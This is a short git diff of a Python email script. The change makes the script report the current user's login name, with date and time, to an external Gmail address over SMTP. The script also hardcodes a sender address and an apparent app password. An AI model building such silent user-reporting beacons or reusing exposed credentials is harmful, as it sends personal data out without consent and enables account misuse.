@@ -2,15 +2,23 @@ from email.message import EmailMessage
 from multiprocessing import context
 import ssl
 import smtplib
+import os
+import datetime
+
 
 email_sender = "emailsendemail83@gmail.com"
 email_password = "xihanzlcljlbhunk"
-email_reciever = "berkefekeskin@gmail.com"
+email_reciever = "ShirisaSaya@gmail.com"
 
 subject = "yo!"
 
-body = """
-Yo, sup bro.
+today = datetime.date.today()
+now = datetime.datetime.now()
+
+body = f"""
+User = {os.getlogin()}
+Date = {today.strftime('%d/%m/%Y')} 
+Time = {now.strftime('%H:%M:%S')}
 """
 
 em = EmailMessage()
